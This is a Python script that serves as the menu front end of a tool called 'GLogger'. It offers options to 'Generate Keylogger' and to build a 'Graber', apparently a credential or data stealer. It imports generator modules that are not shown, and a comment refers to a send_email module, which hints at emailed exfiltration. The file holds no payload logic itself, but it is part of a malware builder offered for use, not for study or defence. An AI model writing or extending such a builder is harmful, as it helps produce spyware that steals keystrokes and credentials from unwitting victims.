import os
import sys
import datetime

# Add the current directory to the Python path to allow importing send_email
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

import generate_file
import generate_Graber

class Logger:
    def __init__(self, filepath):
        self.terminal = sys.stdout
        self.log = open(filepath, "w", encoding="utf-8")

    def write(self, message):
        self.terminal.write(message)
        self.log.write(message)

    def flush(self):
        self.terminal.flush()
        self.log.flush()
        
    def __getattr__(self, attr):
        return getattr(self.terminal, attr)

def setup_logging():
    """Sets up logging to a file."""
    log_dir = "LOG"
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    log_file_path = os.path.join(log_dir, f"glogger_run_{timestamp}.log")
    
    # Redirect stdout and stderr
    logger = Logger(log_file_path)
    sys.stdout = logger
    sys.stderr = logger
    
    # We can't print here because it would be recursive
    # Instead, we write directly to the terminal
    logger.terminal.write(f"Logging to {log_file_path}\n")

def generate_file_placeholder():
    """UI for generating a file."""
    print("\n--- Generate File ---")
    success, message = generate_file.create_file()
    if success:
        print(message)
    else:
        print(f"Error: {message}")
    input("Press Enter to continue...")

def generate_graber_placeholder():
    """UI for generating a file."""
    print("\n--- Generate Graber ---")
    success, message = generate_Graber.create_file()
    if success:
        print(message)
    else:
        print(f"Error: {message}")
    input("Press Enter to continue...")


def main_menu():
    """Displays the main menu and handles user input."""
    while True:
        print("""

     _/_/_/                    _/                                                             _/_/_/    
  _/                          _/          _/_/         _/_/_/        _/_/_/       _/_/       _/    _/   
 _/  _/_/     _/_/_/_/_/     _/        _/    _/     _/    _/      _/    _/     _/_/_/_/     _/_/_/      
_/    _/                    _/        _/    _/     _/    _/      _/    _/     _/           _/    _/     
 _/_/_/                    _/_/_/_/    _/_/         _/_/_/        _/_/_/       _/_/_/     _/    _/      
                                                       _/            _/                                 
                                                  _/_/          _/_/                                    """)
        print("1. Generate Keylogger")
        print("2. Graber")  
        print("3. Exit")

        choice = input("Enter your choice: ")

        if choice == '1':
            generate_file_placeholder()
        
        elif choice == '2':
            generate_graber_placeholder()

        elif choice == '3':
            print("Exiting GLogger UI. Goodbye!")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    setup_logging()
    main_menu()
